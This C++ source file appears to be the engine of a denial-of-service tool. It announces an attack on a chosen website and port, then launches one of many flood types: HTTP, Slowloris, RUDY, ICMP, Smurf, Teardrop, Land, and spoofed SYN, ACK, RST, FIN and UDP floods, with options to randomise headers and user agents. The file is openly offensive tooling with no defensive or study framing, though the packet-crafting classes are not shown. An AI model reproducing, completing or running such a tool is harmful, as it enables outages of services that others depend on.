#include <unistd.h>
#include <array>
#include <memory>

#include "../Headers/Engine.hpp"
#include "../Headers/Attack_Vectors.hpp"

void Engine::run() {
    std::unique_ptr<Attack_Vector> flood;
    std::string message = std::string("Attacking ") + conf->website + ":" + conf->port + " with "
                          + std::to_string(conf->THREADS) + " Threads, "
                          + std::to_string(conf->CONNECTIONS) + " Connections";
    logger->Log(&message, Logger::Warning);
    message = "Delay: " + std::to_string(conf->delay) + " microsecs";
    logger->Log(&message, Logger::Warning);

    switch(conf->vector){
        case Config::HTTP:
            logger->Log("Attack Vector: HTTP", Logger::Info);
            flood = std::make_unique<Http_Flood>(conf, logger);
            break;
        case Config::NullTCP:
            logger->Log("Attack Vector: NullTCP", Logger::Info);
            flood = std::make_unique<Null_Flood>(conf, logger);
            break;
        case Config::NullUDP:
            logger->Log("Attack Vector: NullUDP", Logger::Info);
            flood = std::make_unique<Null_Flood>(conf, logger);
            break;
        case Config::UDPFlood:
            logger->Log("Attack Vector: UDPFlood", Logger::Info);
            flood = std::make_unique<Http_Flood>(conf, logger);
            break;
        case Config::TCPFlood:
            logger->Log("Attack Vector: TCPFlood", Logger::Info);
            flood = std::make_unique<Http_Flood>(conf, logger);
            break;
        case Config::Slowloris:
            logger->Log("Attack Vector: Slowloris", Logger::Info);
            flood = std::make_unique<Slowloris>(conf, logger);
            break;
        case Config::Rudy:
            logger->Log("Attack Vector: Rudy", Logger::Info);
            flood = std::make_unique<Slowloris>(conf, logger);
            break;
        case Config::ICMPFlood:
            logger->Log("Attack Vector: ICMP Flood", Logger::Info);
            flood = std::make_unique<ICMP_Flood>(conf, logger);
            break;
        case Config::Blacknurse:
            logger->Log("Attack Vector: Black Nurse", Logger::Info);
            flood = std::make_unique<ICMP_Flood>(conf, logger);
            break;
        case Config::SpoofedSyn:
            logger->Log("Attack Vector: Spoofed Syn Flood", Logger::Info);
            flood = std::make_unique<Spoofed_TCP_Flood>(conf, logger);
            break;
        case Config::SpoofedAck:
            logger->Log("Attack Vector: Spoofed Ack Flood", Logger::Info);
            flood = std::make_unique<Spoofed_TCP_Flood>(conf, logger);
            break;
        case Config::SpoofedRST:
            logger->Log("Attack Vector: Spoofed Rst Flood", Logger::Info);
            flood = std::make_unique<Spoofed_TCP_Flood>(conf, logger);
            break;
        case Config::SpoofedURG:
            logger->Log("Attack Vector: Spoofed Urg Flood", Logger::Info);
            flood = std::make_unique<Spoofed_TCP_Flood>(conf, logger);
            break;
        case Config::SpoofedPUSH:
            logger->Log("Attack Vector: Spoofed Push Flood", Logger::Info);
            flood = std::make_unique<Spoofed_TCP_Flood>(conf, logger);
            break;
        case Config::SpoofedFin:
            logger->Log("Attack Vector: Spoofed Fin Flood", Logger::Info);
            flood = std::make_unique<Spoofed_TCP_Flood>(conf, logger);
            break;
        case Config::SpoofedUDP:
            logger->Log("Attack Vector: Spoofed UDP", Logger::Info);
            flood = std::make_unique<Spoofed_UDP_Flood>(conf, logger);
            break;
        case Config::Beast:
            logger->Log("Attack Vector: Beast", Logger::Info);
            flood = std::make_unique<Beast>(conf, logger);
            break;
        case Config::TearDrop:
            logger->Log("Attack Vector: Teardrop", Logger::Info);
            flood = std::make_unique<Spoofed_UDP_Flood>(conf, logger);
            break;
        case Config::Land:
            logger->Log("Attack Vector: Land", Logger::Info);
            flood = std::make_unique<Spoofed_TCP_Flood>(conf, logger);
            break;
        case Config::Smurf:{
            logger->Log("Attack Vector: Smurf", Logger::Info);
            flood = std::make_unique<ICMP_Flood>(conf, logger);
            break;
        }
        default:break;
    }
    if(conf->UseSSL){
        logger->Log("SSL Enabled", Logger::Info);
    }
    if(conf->RandomizeHeader){
        logger->Log("Header Randomization Enabled", Logger::Info);
    }
    if(conf->RandomizeUserAgent){
        logger->Log("Useragent Randomization Enabled", Logger::Info);
    }
    logger->Log("Press <Ctrl+C> to stop\n", Logger::Info);
    usleep(1000000);
    flood->run();
}

Engine::Engine(Config *conf, Logger *logger) : conf{conf}, logger{logger} {

}
